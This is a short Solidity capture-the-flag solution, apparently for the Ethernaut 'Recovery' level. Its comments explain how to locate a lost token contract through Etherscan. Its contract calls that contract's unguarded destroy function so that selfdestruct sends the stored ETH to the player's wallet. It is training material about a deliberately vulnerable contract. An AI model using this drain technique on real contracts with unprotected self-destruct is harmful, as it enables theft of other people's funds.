// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Solution:
// Search your instance address on etherscan ---> go to internal tx.
// There you will see a tx with contract creation which is formed by your instance address.
// Tap on contract creation and you got your contract with 0.0001 ETH balance.
// Pass the contract below in constructor.

interface ISimpleToken {
    function name() external returns(string memory);
    function destroy(address payable _to) external;
}

contract Interaction {
    ISimpleToken target; // Pass deployed contract address
    string public names;

    constructor(address _target) {
        target = ISimpleToken(_target);
    }

    function destroyer(address payable to) public {
        target.destroy(to); // trigger self destruct by passing your metamask/wallet address you are using in ethernaut.
    }
}
